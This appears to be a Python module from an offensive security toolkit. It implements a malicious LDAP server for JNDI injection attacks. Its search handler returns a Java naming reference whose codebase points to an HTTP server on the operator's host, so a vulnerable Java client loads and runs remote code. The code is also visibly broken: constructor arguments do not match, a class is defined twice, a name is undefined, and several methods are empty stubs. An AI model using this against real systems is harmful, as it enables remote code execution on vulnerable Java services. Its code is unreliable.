"""
MIT License

Copyright (c) 2020-2022 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from ldaptor import delta, entry
from ldaptor.inmemory import fromLDIFFile
from ldaptor.interfaces import IConnectedLDAPEntry
from ldaptor.protocols import pureldap, pureber
from ldaptor.protocols.ldap import distinguishedname, ldaperrors
from ldaptor.protocols.ldap.ldapserver import LDAPServer
from twisted.application import service
from twisted.internet.endpoints import serverFromString
from twisted.internet.protocol import ServerFactory
from twisted.python import log
from twisted.python.components import registerAdapter

from pex.string import String
from .tools import LDAPTools


class Handler(LDAPServer):
    def __init__(self, host, port, payload):
        self.string_tools = String()

        self.host = host
        self.port = int(port)
        self.payload = payload

        LDAPServer.__init__(self)

    def handle_LDAPSearchRequest(self, request, controls, reply):
        command = request.baseObject.decode()
        command = self.string_tools.base64_decode(command.encode())

        class_name = 'Main'
        reply_url = f'http://{self.host}:{str(self.port)}/'

        attr = [
            ("javaClassName", [class_name]),
            ("objectClass", ["javaNamingReference"]),
            ("javaCodeBase", [reply_url]),
            ("javaFactory", [class_name])
        ]

        reply(
            pureldap.LDAPSearchResultEntry(
                objectName="",
                attributes=attr
            )
        )

        return pureldap.LDAPSearchResultDone(resultCode=ldaperrors.Success.resultCode)


class Factory(ServerFactory):
    protocol = Handler

    def __init__(self, host, port, root=None):
        self.root = root
        super(ServerFactory).__init__()

        self.host = host
        self.port = int(port)

    def buildProtocol(self, addr):
        proto = self.protocol(self.host, self.port)
        proto.debug = self.debug
        proto.factory = self
        return proto


class LDAPListener:
    def __init__(self, host, port, methods={}):
        self.http_tools = LDAPTools()
        self.handler = Handler

        self.host = host
        self.port = int(port)

        self.sock = None

    def listen(self):
        try:
            pass
        except Exception:
            return False

    def stop(self):
        try:
            pass
        except Exception:
            return False

    def accept(self):
        try:
            pass
        except Exception:
            return False


class LDAPListener:
    @staticmethod
    def listen_http(host, port):
        return LDAPListen(host, port)
